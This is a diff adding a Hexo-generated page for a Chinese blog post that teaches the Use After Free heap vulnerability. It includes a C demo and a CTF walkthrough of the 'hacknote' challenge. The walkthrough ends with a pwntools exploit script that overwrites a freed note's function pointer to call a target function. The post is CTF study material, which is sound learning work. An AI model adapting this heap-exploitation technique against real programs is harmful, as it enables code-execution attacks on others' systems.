@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>UAF | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="写在前面 相关博文 个人博客首页 注：学习交流使用！   正文原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAF">
+<meta property="og:url" content="http://example.com/2023/07/24/UAF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="写在前面 相关博文 个人博客首页 注：学习交流使用！   正文原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-24T13:48:34.000Z">
+<meta property="article:modified_time" content="2023-07-25T13:32:52.122Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-UAF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/24/UAF/" class="article-date">
+  <time class="dt-published" datetime="2023-07-24T13:48:34.000Z" itemprop="datePublished">2023-07-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      UAF
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">相关博文</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhangyan8216.github.io/">个人博客首页</a></li>
+<li>注：学习交流使用！</li>
+</ul>
+<hr>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
+<li>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
+</ul>
+<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong><br>举个例子</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *myname;</span><br><span class="line">  <span class="type">void</span> (*func)(<span class="type">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myprint</span><span class="params">(<span class="type">char</span> *str)</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printmyname</span><span class="params">()</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      </span><br><span class="line">this is my function</span><br><span class="line">I can also use it</span><br><span class="line">call print my name</span><br><span class="line">this pogram will crash...</span><br><span class="line">[1]    38738 segmentation fault (core dumped)  ./use_after_free</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="具体实例"><a href="#具体实例" class="headerlink" title="具体实例"></a>具体实例</h2><ul>
+<li><p>[题目地址]：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote</a></p>
+<h2 id="利用分析-："><a href="#利用分析-：" class="headerlink" title="利用分析 ："></a>利用分析 ：</h2><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？</p>
+</li>
+</ul>
+<p>我们可以简单来看一下每一个 note 生成的具体流程</p>
+<p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。<br>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p>
+<p>   +—————–+<br>   |   put           |<br>   +—————–+<br>   |   content       |       size<br>   +—————–+——————-&gt;+—————-+<br>                                          |     real       |<br>                                          |    content     |<br>                                          |                |<br>                                          +—————-+<br>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p>
+<p>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）<br>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）<br>释放 note0<br>释放 note1<br>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0<br>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则<br>note2 其实会分配 note1 对应的内存块。<br>real content 对应的 chunk 其实是 note0。<br>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</p>
+<h2 id="exp脚本"><a href="#exp脚本" class="headerlink" title="exp脚本"></a>exp脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">-*- coding: utf-<span class="number">8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">参考资料1</a></li>
+<li>[参考资料2](【XMCVE 2020 CTF Pwn入门课程】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro?p=11&vd_source=5b65791e50610a90ef8469865c34baa1">https://www.bilibili.com/video/BV1854y1y7Ro?p=11&amp;vd_source=5b65791e50610a90ef8469865c34baa1</a>)</li>
+</ul>
+<hr>
+<h2 id="作者感慨"><a href="#作者感慨" class="headerlink" title="作者感慨"></a>作者感慨</h2><p>UAF是堆中的最简单的漏洞，是基础。</p>
+<p>但是它真的不简单，挺难的。</p>
+<p>但还是那句话张师傅出品，必属精品！！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/24/UAF/" data-id="clsqw0kfc00010k4f2mh32rbr" data-title="UAF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          EXP模板
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;">算法</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/18/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/">算法模板大全</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/">EXP模板</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/24/UAF/">UAF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
